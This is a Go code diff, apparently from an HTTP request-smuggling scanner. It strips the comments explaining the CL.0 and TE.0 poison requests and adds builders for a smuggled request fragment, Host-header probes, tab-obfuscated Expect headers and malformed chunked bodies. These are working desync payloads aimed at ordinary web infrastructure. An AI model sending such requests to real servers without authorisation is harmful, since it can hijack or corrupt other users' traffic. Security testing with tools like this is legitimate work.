@@ -172,11 +172,6 @@ func BuildZeroCLHeadAndBody(rec core.Record, timebased bool) ([]byte, []byte) {
 	return []byte(headers), []byte(body)
 }
 
-// BuildCLZero builds the CL.0 poison request: a POST whose body is a complete,
-// self-contained smuggled request to /<marker>. The front-end honors
-// Content-Length and forwards the whole thing; a back-end that ignores CL
-// treats the body as the next request on the connection, so the smuggled GET
-// surfaces as its own response.
 func BuildCLZero(rec core.Record, marker string) []byte {
 	path, host, ua := extractVariablesFromRecord(rec)
 	body := fmt.Sprintf(
@@ -197,8 +192,6 @@ func BuildCLZero(rec core.Record, marker string) []byte {
 	))
 }
 
-// BuildNormalGet builds a plain keep-alive GET to the record's own path, used
-// as the trailing request in a pipelined desync probe.
 func BuildNormalGet(rec core.Record) []byte {
 	path, host, ua := extractVariablesFromRecord(rec)
 	return []byte(fmt.Sprintf(
@@ -211,13 +204,6 @@ func BuildNormalGet(rec core.Record) []byte {
 	))
 }
 
-// BuildTEZero builds the TE.0 poison request. The front-end honors
-// Transfer-Encoding: chunked; a back-end that ignores TE treats the body as
-// empty and parses the chunk payload as the next request. OPTIONS is used
-// because front-ends that reject bodies on GET/POST let it through (this is the
-// method that made the Google Cloud LB TE.0 fire). No Content-Length is sent.
-// The smuggled prefix ends on a dangling X-Ignore header per the safety rule
-// above, so only the following request is rewritten — no queue poisoning.
 func BuildTEZero(rec core.Record, marker string) []byte {
 	path, host, ua := extractVariablesFromRecord(rec)
 	smuggled := fmt.Sprintf("GET /%s HTTP/1.1\r\nX-Ignore: foo", marker)
@@ -232,4 +218,89 @@ func BuildTEZero(rec core.Record, marker string) []byte {
 			"%s",
 		path, host, ua, chunk,
 	))
+}
+
+func BuildSmuggledFragment(marker string) []byte {
+	return []byte(fmt.Sprintf("GET /%s HTTP/1.1\r\nX-Ignore: foo", marker))
+}
+
+func BuildHostProbe(rec core.Record, altHost string) []byte {
+	path, _, ua := extractVariablesFromRecord(rec)
+	return []byte(fmt.Sprintf(
+		"GET %s HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"User-Agent: %s\r\n"+
+			"Connection: keep-alive\r\n"+
+			"\r\n",
+		path, altHost, ua,
+	))
+}
+
+type ExpectVariant int
+
+const (
+	ExpectNone ExpectVariant = iota
+	ExpectPlain
+	ExpectObfuscated
+)
+
+func BuildExpectHeadersAndBody(rec core.Record, variant ExpectVariant) ([]byte, []byte) {
+	path, host, ua := extractVariablesFromRecord(rec)
+	body := []byte("x=1")
+
+	expectLine := ""
+	switch variant {
+	case ExpectPlain:
+		expectLine = "Expect: 100-continue\r\n"
+	case ExpectObfuscated:
+		expectLine = "Expect:\t100-continue\r\n"
+	}
+
+	headers := fmt.Sprintf(
+		"POST %s HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"User-Agent: %s\r\n"+
+			"Content-Length: %d\r\n"+
+			"Content-Type: application/x-www-form-urlencoded\r\n"+
+			"%s"+
+			"Connection: keep-alive\r\n"+
+			"\r\n",
+		path, host, ua, len(body), expectLine,
+	)
+	return []byte(headers), body
+}
+
+func BuildChunkExtTermExt(rec core.Record) []byte {
+	path, host, ua := extractVariablesFromRecord(rec)
+	payload := fmt.Sprintf(
+		"POST %s HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"User-Agent: %s\r\n"+
+			"Content-Type: application/x-www-form-urlencoded\r\n"+
+			"Transfer-Encoding: chunked\r\n"+
+			"\r\n"+
+			"1;x\n"+
+			"A\r\n"+
+			"0\r\n"+
+			"\r\n",
+		path, host, ua,
+	)
+	return []byte(payload)
+}
+
+func BuildChunkExtExtTerm(rec core.Record) []byte {
+	path, host, ua := extractVariablesFromRecord(rec)
+	payload := fmt.Sprintf(
+		"POST %s HTTP/1.1\r\n"+
+			"Host: %s\r\n"+
+			"User-Agent: %s\r\n"+
+			"Content-Type: application/x-www-form-urlencoded\r\n"+
+			"Transfer-Encoding: chunked\r\n"+
+			"\r\n"+
+			"f;x\n"+
+			"0\r\n"+
+			"\r\n",
+		path, host, ua,
+	)
+	return []byte(payload)
 }
